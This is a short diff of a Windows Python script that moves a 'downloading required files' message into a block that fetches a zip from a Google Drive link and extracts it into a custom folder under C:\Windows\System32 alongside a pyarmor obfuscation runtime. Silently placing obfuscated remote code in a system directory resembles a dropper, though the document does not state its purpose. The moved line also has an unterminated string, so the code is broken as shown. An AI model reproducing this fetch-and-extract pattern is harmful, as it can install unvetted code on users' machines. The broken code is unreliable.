@@ -129,7 +129,6 @@ def delete_files_if_aesv3_missing():
                     shutil.rmtree(item)
                     os.system('cls')
                     print("")
-                    show_info_message("Info", "AES will start downloading required files, please click ok and wait a moment.)
                     print("")
                     print("")
     else:
@@ -143,6 +142,7 @@ def download_file_from_google_drive(url, output_path):
 
 if not os.path.exists("C:\\Windows\\System32\\WCNMX\\pyarmor_runtime_000000"):
     print("--downloading required libraries, please wait a moment...")
+    show_info_message("Info", "AES will start downloading required files, please click ok and wait a moment.)
     download_file_from_google_drive("https://drive.google.com/uc?id=1baNFnp-MewLdwwYfCDqK-d-dyW09XLFt", "C:\\Windows\\System32\\WCNMX\\moonv1.zip")
     zip_file = r'C:\Windows\System32\WCNMX\moonv1.zip'
     extract_dir = r'C:\Windows\System32\WCNMX'
